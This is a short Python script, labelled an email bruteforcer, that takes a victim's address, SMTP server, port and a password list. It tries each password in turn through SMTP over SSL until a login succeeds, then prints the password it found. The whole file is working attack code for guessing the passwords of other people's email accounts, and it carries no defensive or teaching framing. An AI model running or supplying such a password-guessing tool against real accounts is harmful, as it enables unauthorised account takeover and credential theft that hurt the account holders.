#!/usr/bin/env python3
# Python 3.4 
# bruteforce over SMTP + SSL
# made by Xtr3am3r.0k@gmail.com 

import smtplib
import email
import sys
import time
import os
import argparse



parser = argparse.ArgumentParser(description='Simple email bruteforcer')
parser.add_argument('-v','--victim-email', help='Specify the victims email', required=True)
parser.add_argument('-s','--victim-smtp', help='Set the victims smtp server (exemple: smtp.mail.ru)', required=True)
parser.add_argument('-p','--smtp-port', help='Set the smtp port', required=True)
parser.add_argument('-d','--dictionnary', help='Set the dictionnary', required=True)
args = vars(parser.parse_args())

victim_mail = args['victim_email']
smtp_server = args['victim_smtp']
port = args['smtp_port']
dict_brut = open(args['dictionnary'],'r')
for list_pass in dict_brut:
    passwd = list_pass.rstrip()
    print("[*] try password: {} ".format(passwd))
    try:
        smtp = smtplib.SMTP_SSL(smtp_server, int(port))
        smtp.ehlo()
        answer, status  = smtp.login(victim_mail, passwd)
        if status == b'Authentication succeeded':
            print("\n[+] Cool Password Found: {}".format(passwd))
            break
        else:
            raise ConnectionResetError
    except:
        time.sleep(1)
        pass